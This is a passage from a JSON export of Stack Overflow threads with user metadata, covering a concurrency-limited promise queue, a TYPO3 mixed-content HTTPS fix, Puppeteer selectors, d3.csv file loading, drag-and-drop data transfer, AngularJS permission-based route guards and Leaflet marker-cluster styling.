class=\"snippet-code-js lang-js prettyprint-override\"><code>const queue = ((v) =&gt; (count) =&gt; Promise .resolve (\r\n  Array .from ( {length: Math .min (count, 10 - v + 1) }, () =&gt; ( { id: v++ } ))\r\n)) (1)\r\n \r\nqueue (3) .then (console.log) //~&gt; [{id: 1}, {id: 2}, {id: 3}]\r\nqueue (3) .then (console.log) //~&gt; [{id: 4}, {id: 5}, {id: 6}]\r\nqueue (3) .then (console.log) //~&gt; [{id: 7}, {id: 8}, {id: 9}]\r\nqueue (3) .then (console.log) //~&gt; [{id: 10}]\r\nqueue (3) .then (console.log) //~&gt; [] // (and will forevermore return the empty list)</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>Then we can combine it with a function that processes one item, a reducer that simply concatenates arrays, and an empty array to start with, to get something like this:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>const processQueue = (queue, count, process, combine, init) =&gt;\r\n  queue (count)\r\n    .then ( items =&gt; items .map (process) )\r\n    .then ( promises =&gt; Promise .all (promises) )\r\n    .then ( curr =&gt; curr .length\r\n      ? processQueue ( queue, count, process, combine, combine(init, curr) )\r\n      : combine (init, curr)\r\n    )\r\n\r\nconst queue = ((v) =&gt; (count) =&gt; Promise.resolve (\r\n  Array .from ( {length: Math .min (count, 10 - v + 1) }, () =&gt; ( { id: v++ } ))\r\n)) (1)\r\n\r\n\r\nprocessQueue(\r\n  queue, \r\n  3, \r\n  ( {id} ) =&gt; ( {square: id * id} ),\r\n  (a, b) =&gt; a .concat (b),\r\n  []\r\n) .then (console.log)\r\n//~&gt; [{square: 1}, {square: 4}, {square: 9}, ..., {square: 100}]</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>Although this looks at first like it might have problems with recursion depth, we're leaving our current stack frames in each <code>.then(...)</code>.  You can see that this still works if you replace <code>10</code> in <code>queue</code> with <code>100000</code>.  (I didn't have the patience for a million!)</p>\n\n<p>In your case, if you don't need to return anything from your processing function, and therefore don't need to do any combining in a reducer function, this could clearly be simplified a bit.  But if you need to do anything there, even just reporting counts of successful transformations versus errors, then this full version might be appropriate.</p>\n\n<hr>\n\n<p>Now I'm off to fix my recent code to use this abstraction...</p>\n"}], "owner": {"reputation": 3144, "user_id": 297824, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/d1cf72408e13e38a3bf918413f762e94?s=128&d=identicon&r=PG", "display_name": "T3db0t", "link": "https://stackoverflow.com/users/297824/t3db0t"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 147, "favorite_count": 1, "answer_count": 2, "score": 1, "last_activity_date": 1558563465, "creation_date": 1558554562, "question_id": 56263994, "link": "https://stackoverflow.com/questions/56263994/node-js-controllable-concurrent-while-loop", "title": "Node.js: Controllable concurrent while loop", "body": "<p>I have a mongodb collection of 1.7 million records. Each record is an ID number. I need to read off each ID number, do some requests to another service, transform the data, write it to a different collection, and remove the original ID record if all was successful.</p>\n\n<p>I want a script that does those things indefinitely until the collection is empty, with specifiable concurrency (i.e. max 3 requests at any time).</p>\n\n<p>Normally I would use Bluebird's <code>map</code>, which can specify number of concurrent promises, but there is no input array (unless I were to read off all the input records into memory, which I am not going to do).</p>\n\n<p>What I want is essentially a concurrent while loop, i.e.: (pseudo-javascript)</p>\n\n<pre><code>promiseWhile(queueNotEmpty, 3){\n  readFromQueue\n    .then(doc =&gt; {\n      return process(doc);\n    })\n    .then(result =&gt; {\n      if(result == \"empty\") // (or whatever)\n        queueNotEmpty = false;\n    });\n} \n</code></pre>\n"}, {"tags": ["javascript", "https", "xmlhttprequest", "typo3", "mixed-content"], "comments": [{"owner": {"reputation": 5936, "user_id": 1735653, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/KSGfY.jpg?s=128&g=1", "display_name": "Lee Brindley", "link": "https://stackoverflow.com/users/1735653/lee-brindley"}, "edited": false, "score": 1, "creation_date": 1558554617, "post_id": 56263961, "comment_id": 99144380, "body": "var siteurl=&#39;<a href=\"https://www.example.com/\" rel=\"nofollow noreferrer\">example.com</a>&#39;;"}, {"owner": {"reputation": 175, "user_id": 11541354, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f4ecccc720bc8553b85b655d01f9062e?s=128&d=identicon&r=PG&f=1", "display_name": "MAZ", "link": "https://stackoverflow.com/users/11541354/maz"}, "reply_to_user": {"reputation": 5936, "user_id": 1735653, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/KSGfY.jpg?s=128&g=1", "display_name": "Lee Brindley", "link": "https://stackoverflow.com/users/1735653/lee-brindley"}, "edited": false, "score": 0, "creation_date": 1558555088, "post_id": 56263961, "comment_id": 99144578, "body": "I replaced <code>var siteurl=\\&#39;&#39;.\\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::getIndpE&zwnj;&#8203;nv(&#39;TYPO3_SITE_URL&#39;)&zwnj;&#8203;.&#39;\\&#39;;</code> with <code>var siteurl=&#39;example.com&#39;;</code> but I get error on the output page"}, {"owner": {"reputation": 2530, "user_id": 3946047, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/c236700abcfe23472d68334d54610451?s=128&d=identicon&r=PG", "display_name": "Peter Kraume", "link": "https://stackoverflow.com/users/3946047/peter-kraume"}, "edited": false, "score": 1, "creation_date": 1558559996, "post_id": 56263961, "comment_id": 99146669, "body": "Why not enforcing https for the whole site, e.g. with a mod_rewrite rule in your .htaccess? Or you could try to set  <code>var siteurl=&#39;https:&#47;&#47;www.example.tld&#39;;</code>"}], "answers": [{"tags": [], "owner": {"reputation": 175, "user_id": 11541354, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f4ecccc720bc8553b85b655d01f9062e?s=128&d=identicon&r=PG&f=1", "display_name": "MAZ", "link": "https://stackoverflow.com/users/11541354/maz"}, "is_accepted": true, "score": 0, "last_activity_date": 1558609936, "creation_date": 1558609936, "answer_id": 56273969, "question_id": 56263961, "link": "https://stackoverflow.com/questions/56263961/replace-http-with-https-on-var-siteurl-to-remove-the-xmlhttprequest-error/56273969#56273969", "title": "Replace HTTP with HTTPS on var siteurl to remove the xmlhttprequest error", "body": "<p>The problem comes from the ajax <code>siteurl</code> call :</p>\n\n<p>I changed this : </p>\n\n<pre><code>$.ajax({\n    type: \"GET\",\n    url: siteurl+surl,\n</code></pre>\n\n<p>to : </p>\n\n<pre><code>$.ajax({\n    type: \"GET\",\n    url: 'https://example.com/index.php?eID=tasksdata',\n</code></pre>\n"}], "owner": {"reputation": 175, "user_id": 11541354, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f4ecccc720bc8553b85b655d01f9062e?s=128&d=identicon&r=PG&f=1", "display_name": "MAZ", "link": "https://stackoverflow.com/users/11541354/maz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 80, "favorite_count": 0, "accepted_answer_id": 56273969, "answer_count": 1, "score": 0, "last_activity_date": 1558609936, "creation_date": 1558554458, "question_id": 56263961, "link": "https://stackoverflow.com/questions/56263961/replace-http-with-https-on-var-siteurl-to-remove-the-xmlhttprequest-error", "title": "Replace HTTP with HTTPS on var siteurl to remove the xmlhttprequest error", "body": "<p>I have this error :</p>\n\n<pre><code>Mixed content the page at was loaded over https but requested an insecure xmlhttprequest endpoint\n</code></pre>\n\n<p>When checked to source code i find this javascript :</p>\n\n<p><strong>HTML OUTPUT :</strong></p>\n\n<pre><code>    var checkTasksInterval=10000;\n    var taskesstr='111';\n    var thispageid=1;\n    var siteurl='http://www.example.com/';\n</code></pre>\n\n<p>How can I change the <code>var siteurl</code> to <code>https</code> in this javascript ?</p>\n\n<pre><code>    &lt;script language=\"JavaScript\"&gt;\n    var checkTasksInterval='.$sysconf['checkTasksInterval'].';\n    var tasksstr=\\''.$tasksstr.'\\';\n    var thispageid='.$GLOBALS['TSFE']-&gt;id.';\n    var siteurl=\\''.\\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::getIndpEnv('TYPO3_SITE_URL').'\\';\n    &lt;/script&gt;\n</code></pre>\n"}, {"tags": ["javascript", "selector", "puppeteer"], "comments": [{"owner": {"reputation": 7179, "user_id": 3305454, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GFCwY.jpg?s=128&g=1", "display_name": "roberrrt-s", "link": "https://stackoverflow.com/users/3305454/roberrrt-s"}, "edited": false, "score": 0, "creation_date": 1558554484, "post_id": 56263943, "comment_id": 99144326, "body": "Hi, can you show us your click functionality? Where exactly are you using the <code>.click()</code> function on"}, {"owner": {"reputation": 15319, "user_id": 5627599, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/27jw3.jpg?s=128&g=1", "display_name": "Thomas Dondorf", "link": "https://stackoverflow.com/users/5627599/thomas-dondorf"}, "edited": false, "score": 0, "creation_date": 1558554936, "post_id": 56263943, "comment_id": 99144518, "body": "You might want to use a <a href=\"https://stackoverflow.com/a/55956674/5627599\">more complex selector</a> and then use <code>document.querySelector</code> or <code>page.$</code> in puppeteer."}, {"owner": {"reputation": 101, "user_id": 8880804, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/41ffbd8f3505e28468cdf6cde76cf497?s=128&d=identicon&r=PG&f=1", "display_name": "Rsp8", "link": "https://stackoverflow.com/users/8880804/rsp8"}, "edited": false, "score": 0, "creation_date": 1558720517, "post_id": 56263943, "comment_id": 99207230, "body": "the more complex selector is a great tool and I am able to send .click() to that element within the JS Console, however, I&#39;m not sure how to use that within puppeteer.  <code>await page.$(&#39;#popupTaskMenu &gt; nav &gt; div.nth-child(2)&#39;)</code> is correct I believe, but how do I send .click() to that?  I&#39;ll read and play around some more."}, {"owner": {"reputation": 101, "user_id": 8880804, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/41ffbd8f3505e28468cdf6cde76cf497?s=128&d=identicon&r=PG&f=1", "display_name": "Rsp8", "link": "https://stackoverflow.com/users/8880804/rsp8"}, "edited": false, "score": 0, "creation_date": 1558725165, "post_id": 56263943, "comment_id": 99209035, "body": "so I&#39;ve tried a few different options, and no matter which, I get an error that states &quot;ERR Evaluation failed: DOMException: Failed to execute &#39;querySelector&#39; on &#39;Document&#39;: &#39;#popupTaskMenu &gt; nav &gt; div.nth-child(2)&#39; is not a valid selector.  Last line I tried was <code>await page.evaluate((selector) =&gt; document.querySelector(&#39;#popupTaskMenu &gt; nav &gt; div.nth-child(2)&#39;).click();</code>"}], "answers": [{"tags": [], "owner": {"reputation": 76, "user_id": 10979471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a3c4d74d422956f24691fe886b5c7e7d?s=128&d=identicon&r=PG&f=1", "display_name": "JMeyer Data Science", "link": "https://stackoverflow.com/users/10979471/jmeyer-data-science"}, "is_accepted": false, "score": 0, "last_activity_date": 1558556555, "last_edit_date": 1558556555, "creation_date": 1558555699, "answer_id": 56264261, "question_id": 56263943, "link": "https://stackoverflow.com/questions/56263943/selecting-a-div-inside-a-nav/56264261#56264261", "title": "Selecting a Div inside a Nav", "body": "<p>It looks like you are just trying to target this guy and make him do something. </p>\n\n<pre><code> &lt;div task-item=\"0\" class=\"task_launcher_item_click\"&gt;Text&lt;/div&gt;\n</code></pre>\n\n<p>if that is the case, can you use <code>const Nav = document.getElementById(); \n await Nav.click();</code> function instead and give it it's own ID while still retaining the <code>task_launcher_item_click</code> class?  </p>\n\n<p>Once you have the click on that specific element can you use a promise function <a href=\"https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md#frameclickselector-options\" rel=\"nofollow noreferrer\">https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md#frameclickselector-options</a>  </p>\n\n<pre><code>const [response] = await Promise.all([\n  page.waitForNavigation(waitOptions),\n  frame.click(selector, clickOptions),\n]);  \n</code></pre>\n\n<p>or an attribute selector <a href=\"https://drafts.csswg.org/selectors-4/#attribute-selectors\" rel=\"nofollow noreferrer\">https://drafts.csswg.org/selectors-4/#attribute-selectors</a>  </p>\n\n<pre><code>const element = await page.$('[href=\"http://www.iana.org/domains/example\"]');\n    await element.click();\n  } catch (err) {\n    console.error(err);\n  }\n})();\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 101, "user_id": 8880804, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/41ffbd8f3505e28468cdf6cde76cf497?s=128&d=identicon&r=PG&f=1", "display_name": "Rsp8", "link": "https://stackoverflow.com/users/8880804/rsp8"}, "is_accepted": true, "score": 0, "last_activity_date": 1558726246, "creation_date": 1558726246, "answer_id": 56298604, "question_id": 56263943, "link": "https://stackoverflow.com/questions/56263943/selecting-a-div-inside-a-nav/56298604#56298604", "title": "Selecting a Div inside a Nav", "body": "<p>Alright, someday I'm going to be a smart person...  my problem was I was using <code>#popupTaskMenu &gt; nav &gt; div.nth-child(2)</code>  when it should have been <code>#popupTaskMenu &gt; nav &gt; div:nth-child(2)</code></p>\n\n<p>I should have used a COLON rather than the period!!!!  2 hours of my life people!</p>\n"}], "owner": {"reputation": 101, "user_id": 8880804, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/41ffbd8f3505e28468cdf6cde76cf497?s=128&d=identicon&r=PG&f=1", "display_name": "Rsp8", "link": "https://stackoverflow.com/users/8880804/rsp8"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 298, "favorite_count": 0, "accepted_answer_id": 56298604, "answer_count": 2, "score": 1, "last_activity_date": 1558726246, "creation_date": 1558554368, "question_id": 56263943, "link": "https://stackoverflow.com/questions/56263943/selecting-a-div-inside-a-nav", "title": "Selecting a Div inside a Nav", "body": "<p>I am attempting to automate some functions within Chrome using Puppeteer and Chromium. I'm able to log in, select the main navigation element and the sub-navigation menu appears.  I'm currently playing in the console to find the correct selector to pass into Puppeteer, however, I'm having difficulty.  </p>\n\n<p>HTML below:</p>\n\n<pre><code>&lt;div id=\"popupTaskMenu\" class=\"launcher...\"&gt;\n  &lt;div -not important to task&gt;&lt;/div&gt;\n  &lt;nav class=\"task_launcher_item_heading\"&gt;\n    &lt;div task-item=\"0\" class=\"task_launcher_item_click\"&gt;Text&lt;/div&gt;\n    &lt;div task-item=\"1\" class=\"task_launcher_item\"&gt;Text&lt;/div&gt;\n  &lt;/nav&gt;\n&lt;div&gt;\n</code></pre>\n\n<p>With in the Chrome console I can get somewhat close to making the <code>&lt;nav&gt;</code> items accessible by using <code>document.getElementsByClassName(\"task_launcher_item_heading\")[0].childNodes[0].innerText</code>, which will return the innerText of the element, but using the <code>.click()</code> method comes back undefined.</p>\n\n<p>Any ideas will surely help.</p>\n"}, {"tags": ["javascript", "html"], "answers": [{"tags": [], "owner": {"reputation": 61, "user_id": 10392961, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89d9f2256c2632337b11a663bb9a7d69?s=128&d=identicon&r=PG&f=1", "display_name": "S Dilwali", "link": "https://stackoverflow.com/users/10392961/s-dilwali"}, "is_accepted": false, "score": 1, "last_activity_date": 1559226788, "creation_date": 1559226788, "answer_id": 56380317, "question_id": 56263905, "link": "https://stackoverflow.com/questions/56263905/pass-user-selected-value-from-dropdown-menu-to-d3-csv/56380317#56380317", "title": "Pass user selected value, from dropdown menu, to d3.csv", "body": "<pre><code>d3.csv(document.getElementById('year').value &amp; \".csv\", function(error,data) {\n ...\n});\n</code></pre>\n\n<p><a href=\"https://github.com/d3/d3-fetch/blob/v1.1.2/README.md#csv\" rel=\"nofollow noreferrer\">https://github.com/d3/d3-fetch/blob/v1.1.2/README.md#csv</a></p>\n"}], "owner": {"reputation": 1637, "user_id": 4430536, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/51713a7c5ebbdcb411bb821889591145?s=128&d=identicon&r=PG&f=1", "display_name": "Clauric", "link": "https://stackoverflow.com/users/4430536/clauric"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 52, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1559226788, "creation_date": 1558554211, "question_id": 56263905, "link": "https://stackoverflow.com/questions/56263905/pass-user-selected-value-from-dropdown-menu-to-d3-csv", "title": "Pass user selected value, from dropdown menu, to d3.csv", "body": "<p>Somewhat similar to this previous question <a href=\"https://stackoverflow.com/q/27757384/4430536\">enter link description here</a>, but for d3.</p>\n\n<p>Basically, I have a dropdown menu that the user can select the year they would like to view. When the user selects the year, I would like to pass that data to the d3.csv command to select the relevant csv file.</p>\n\n<p>The html code is as follows:</p>\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;form&gt;                                  &lt;!-- drop down to select year for data --&gt;\n        &lt;label&gt;Select year to see each team's scoring:&lt;/label&gt;\n        &lt;select id=\"year\"&gt;\n            &lt;option value=\"Rugby - 2014\"&gt;2014 - 2015&lt;/option&gt;\n            &lt;option value=\"Rugby - 2015\"&gt;2015 - 2016&lt;/option&gt;\n            &lt;option value=\"Rugby - 2016\"&gt;2016 - 2017&lt;/option&gt;\n            &lt;option value=\"Rugby - 2017\"&gt;2017 - 2018&lt;/option&gt;\n            &lt;option value=\"Rugby - 2018\"&gt;2018 - 2019&lt;/option&gt;           \n            &lt;option value=\"Rugby - Total\"&gt;2014 - 2019&lt;/option&gt;          \n        &lt;/select&gt;\n    &lt;form&gt;\n</code></pre>\n\n<p>I've tried a few iterations, and this is the one I am on now:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt; \n\n    d3.csv(document.getElementById('year').value &amp; \".csv\").then(function(data){ &lt;!-- import CSV file\n        data.forEach(function(d) {                                      \n            For = +d.For                                                &lt;!-- set 'For' name to d.For and convert to number --&gt;\n            Against = +d.Against                                        &lt;!-- set 'Against' name to d.Against and convert to number --&gt;\n            Teams = d.Teams                                             &lt;!-- set 'teams' name to d.teams --&gt;\n        })})\n&lt;/script&gt;\n</code></pre>\n\n<p>Edit: The error I'm getting is <code>TypeError: d3.csv(...).then is not a function</code></p>\n\n<p>Any suggestions on how to get the selected value from the dropdown into the d3.csv script?</p>\n"}, {"tags": ["javascript", "html", "drag-and-drop"], "comments": [{"owner": {"reputation": 91, "user_id": 8819895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bf99ed3cb6a44a79f63b1bb7e4d8556?s=128&d=identicon&r=PG&f=1", "display_name": "mattemyo", "link": "https://stackoverflow.com/users/8819895/mattemyo"}, "edited": false, "score": 0, "creation_date": 1558555512, "post_id": 56263885, "comment_id": 99144783, "body": "What is not working? Does the value for <code>name</code> become <code>undefined</code> in the url?"}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 11493437, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-YgHmGXK91VI/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rftVRx1gDMlWvFIk4eKEdQbcXpi-Q/mo/photo.jpg?sz=128", "display_name": "Nidgey10", "link": "https://stackoverflow.com/users/11493437/nidgey10"}, "edited": false, "score": 0, "creation_date": 1558618022, "post_id": 56268721, "comment_id": 99166941, "body": "Thank you for your help! I understand your 1st part so I use  event.dataTransfer.setData(&quot;text&quot;, event.target.getAttribute(&#39;id,name&#39;) ); but then how do I extract each attribute? var elem_id = event.dataTransfer.getData(&quot;text&quot;); \tvar name = event.dataTransfer.getData(&quot;text&quot;);  Can you explain with a piece of code or in my code. sorry if Im just being silly"}, {"owner": {"reputation": 21, "user_id": 11493437, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-YgHmGXK91VI/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rftVRx1gDMlWvFIk4eKEdQbcXpi-Q/mo/photo.jpg?sz=128", "display_name": "Nidgey10", "link": "https://stackoverflow.com/users/11493437/nidgey10"}, "edited": false, "score": 0, "creation_date": 1558619205, "post_id": 56268721, "comment_id": 99167694, "body": "getData(&quot;text&quot;.split(&quot;,&quot;)[0]); is this along the lines of what you&#39;re meaning?"}], "tags": [], "owner": {"reputation": 126, "user_id": 4225117, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c478a948eaf8098e342daa158a56292c?s=128&d=identicon&r=PG&f=1", "display_name": "Peter-Yu", "link": "https://stackoverflow.com/users/4225117/peter-yu"}, "is_accepted": false, "score": 0, "last_activity_date": 1558926324, "last_edit_date": 1592644375, "creation_date": 1558590243, "answer_id": 56268721, "question_id": 56263885, "link": "https://stackoverflow.com/questions/56263885/is-is-possible-to-transfer-two-attributes-within-one-object-at-once/56268721#56268721", "title": "Is is possible to transfer two attributes within one object at once?", "body": "<p>Please look <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/HTML_Drag_and_Drop_API/Drag_operations#dragdata\" rel=\"nofollow noreferrer\">this (Drag Data)</a></p>\n<p>You can't call DataTransfer.setData(&quot;text&quot;, &quot;your data&quot;) twice, the second value will  override first.</p>\n<p>The first param of setData() is mime type string, one type can just set once, if you want to set 2 value, you could:</p>\n<ol>\n<li>use setData(&quot;text&quot;, &quot;id,name&quot;), and use split with &quot;,&quot; to extract</li>\n<li>use setData(&quot;application/json&quot;, '{&quot;id&quot;:&quot;id&quot;, &quot;name&quot;:&quot;name&quot;}'), then read as a object.</li>\n</ol>\n<p>example for 1st way:</p>\n<pre><code>event.dataTransfer.setData(\n    &quot;text&quot;, \n    event.target.getAttribute('id')+','+ event.target.getAttribute('name'));\n</code></pre>\n<p>then getData like this:</p>\n<pre><code>var val = event.dataTransfer.getData(&quot;text&quot;).split(',');\nvar elem_id = val[0];\nvar name = val[1];\n</code></pre>\n<p>Of course your name can't contain char ',' or you could change to other char that hard to duplicate like '^' or '%'</p>\n"}, {"tags": [], "owner": {"reputation": 21, "user_id": 11493437, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-YgHmGXK91VI/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rftVRx1gDMlWvFIk4eKEdQbcXpi-Q/mo/photo.jpg?sz=128", "display_name": "Nidgey10", "link": "https://stackoverflow.com/users/11493437/nidgey10"}, "is_accepted": true, "score": 0, "last_activity_date": 1558644329, "creation_date": 1558644329, "answer_id": 56282680, "question_id": 56263885, "link": "https://stackoverflow.com/questions/56263885/is-is-possible-to-transfer-two-attributes-within-one-object-at-once/56282680#56282680", "title": "Is is possible to transfer two attributes within one object at once?", "body": "<pre><code>event.dataTransfer.setData(\"text\", event.target.getAttribute('id') );\nevent.dataTransfer.setData(\"text1\", event.target.getAttribute('name') );\n\n\nvar elem_id = event.dataTransfer.getData(\"text\");\nvar name = event.dataTransfer.getData(\"text1\");\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 11493437, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-YgHmGXK91VI/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rftVRx1gDMlWvFIk4eKEdQbcXpi-Q/mo/photo.jpg?sz=128", "display_name": "Nidgey10", "link": "https://stackoverflow.com/users/11493437/nidgey10"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "accepted_answer_id": 56282680, "answer_count": 2, "score": 2, "last_activity_date": 1558926324, "creation_date": 1558554152, "last_edit_date": 1558582857, "question_id": 56263885, "link": "https://stackoverflow.com/questions/56263885/is-is-possible-to-transfer-two-attributes-within-one-object-at-once", "title": "Is is possible to transfer two attributes within one object at once?", "body": "<p>I'm already transferring the \"id\" through my drag and drop. But I would like to transfer a 2nd attribute \"name\". Is this possible and if so how would I change this in my code</p>\n\n<pre><code>function drag_start(event) {\n    _('app_status').innerHTML = \"Dragging the \"+event.target.getAttribute('id');\n    event.dataTransfer.dropEffect = \"move\";\n    event.dataTransfer.setData(\"text\", event.target.getAttribute('id') );\n    event.dataTransfer.setData(\"text\", event.target.getAttribute('name') );\n}\n\nfunction drag_drop(event) {\n    event.preventDefault();\n    var hr = new XMLHttpRequest();\n    var url = \"test_parse_example.php\";\n\n    var elem_id = event.dataTransfer.getData(\"text\");\n    var name = event.dataTransfer.getData(\"text\");\n\n    var event_id = event.target.getAttribute('id');\n    var value = event.target.getAttribute('value');\n    var time = document.getElementById(\"display\").innerHTML = displayHours + \":\" + displayMinutes + \":\" + displaySeconds;\n    var vars = \"elem_id=\"+elem_id+\"&amp;event_id=\"+event_id+\"&amp;value=\"+value+\"&amp;time=\"+time+\"&amp;name=\"+name;\n    hr.open(\"POST\", url, true);\n    hr.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\n    hr.onreadystatechange = function() {\n        if(hr.readyState == 4 &amp;&amp; hr.status == 200) {\n            var return_data = hr.responseText;\n            document.getElementById(\"status\").innerHTML = return_data;\n        }\n    }\n\n    hr.send(vars); \n}\n</code></pre>\n"}, {"tags": ["javascript", "angularjs", "redirect", "angularjs-directive"], "comments": [{"owner": {"reputation": 46815, "user_id": 5535245, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YnjcO.jpg?s=128&g=1", "display_name": "georgeawg", "link": "https://stackoverflow.com/users/5535245/georgeawg"}, "edited": false, "score": 1, "creation_date": 1558557675, "post_id": 56263881, "comment_id": 99145741, "body": "Usually one use resolve functions in the route configuration to abort loading of an unauthorized route."}], "answers": [{"tags": [], "owner": {"reputation": 1739, "user_id": 2814716, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/46a2bec8c4bfce67fbb537a50a108cac?s=128&d=identicon&r=PG&f=1", "display_name": "Sergio Rinaudo", "link": "https://stackoverflow.com/users/2814716/sergio-rinaudo"}, "is_accepted": false, "score": 0, "last_activity_date": 1558598276, "creation_date": 1558598276, "answer_id": 56270547, "question_id": 56263881, "link": "https://stackoverflow.com/questions/56263881/angularjs-redirect-to-mainroute-when-use-does-not-have-permission-to-see-the-p/56270547#56270547", "title": "AngularJS | Redirect to MainRoute when use does not have permission to see the page", "body": "<p>In Angular2+ there are RouteGuards, in AngularJS you can use a similar solution with the premise that you are using uiRouter</p>\n\n<p>In your state add a resolve function that checks if the use has the right permission, return a rejected promise if not</p>\n\n<pre><code>    resolve: {\n       security: ['$q', function($q, Auth){\n           // Checking permission here, you can pass the resource or some other \n           // data is necessary\n           if(!Auth.isAllowed()){\n              return $q.reject(\"Not Authorized\");\n           }\n       }]\n</code></pre>\n\n<p>This will avoid controller to load.\nTo redirect to your landingPage add this listener in you application run function</p>\n\n<pre><code>        $rootScope.$on('$stateChangeError', function(e, toState, toParams, fromState, fromParams, error){\n\n            if(error === \"Not Authorized\"){\n                $state.go(\"landingPageOrWherever\");\n            }\n        });\n</code></pre>\n\n<p>I've tested it and it's working.</p>\n\n<p>As already answered <a href=\"https://stackoverflow.com/questions/28518181/angular-ui-router-how-to-prevent-access-to-a-state\">here</a></p>\n"}], "owner": {"reputation": 1690, "user_id": 10104341, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df7326ce0b47203cf7bf776da128e5a6?s=128&d=identicon&r=PG&f=1", "display_name": "Dimitris Efst", "link": "https://stackoverflow.com/users/10104341/dimitris-efst"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 60, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558598276, "creation_date": 1558554134, "question_id": 56263881, "link": "https://stackoverflow.com/questions/56263881/angularjs-redirect-to-mainroute-when-use-does-not-have-permission-to-see-the-p", "title": "AngularJS | Redirect to MainRoute when use does not have permission to see the page", "body": "<p>I am using a multi-tier auth-system, with my AngularJS App(Angular 1.6.4).</p>\n\n<p>Meaning, that a user has multiple permissions. Depending on the permission he has he can see or not the page the permissions apply to.</p>\n\n<p>I have already managed to hide all the necessary HTML Elements regarding that screen depending on the permission level. But now I am having a bit of problem protecting the Route Itself.</p>\n\n<p>Basically, I want the user to redirect to my Landing Page if the permissions he has are not contained in the Array of Permissions provided to him on Log-In.</p>\n\n<p>Here is what I did:</p>\n\n<pre><code>  $rootScope.$on(\"rebalancing\", () =&gt; {\n    if (user.permissions !== Role.ViewConnectors || user.permissions !== \n       Role.ManageConnectors) {\n      redirectTo(application.APP)\n    }\n  });\n</code></pre>\n\n<p>But it doesn't seem to be doing anything. Can you please help me. I understand that this action needs to be checked before everything else. So, <code>rootScope</code> seemed like a good place to start.</p>\n\n<p><strong>More Info</strong>\nThe user is provided by the ReduxStore, that I am passing. The <code>application.APP</code> is the home route of the application. And the redirectTo, is a custom utility to <code>redirectTo(/etc...)</code></p>\n"}, {"tags": ["javascript", "html", "css", "leaflet", "leaflet.markercluster"], "comments": [{"owner": {"reputation": 2141, "user_id": 5427402, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5dd881653bd78d789447ff42c3aaad7c?s=128&d=identicon&r=PG&f=1", "display_name": "Joffrey Schmitz", "link": "https://stackoverflow.com/users/5427402/joffrey-schmitz"}, "edited": false, "score": 2, "creation_date": 1558561221, "post_id": 56263876, "comment_id": 99147069, "body": "I tried on an example in the GitHub repository of the markercluster library, copy/paste your <code>iconCreateFunction</code> and your two extra CSS rules, and I have the clusters in blue."}, {"owner": {"reputation": 34057, "user_id": 5108796, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf3d4505d0473b230f8b413248f7439f?s=128&d=identicon&r=PG&f=1", "display_name": "ghybs", "link": "https://stackoverflow.com/users/5108796/ghybs"}, "edited": false, "score": 0, "creation_date": 1558577581, "post_id": 56263876, "comment_id": 99150302, "body": "@MaxMichel sounds like you should edit your question to explain more specifically what you are missing, compared to the code sample you provide."}, {"owner": {"reputation": 403, "user_id": 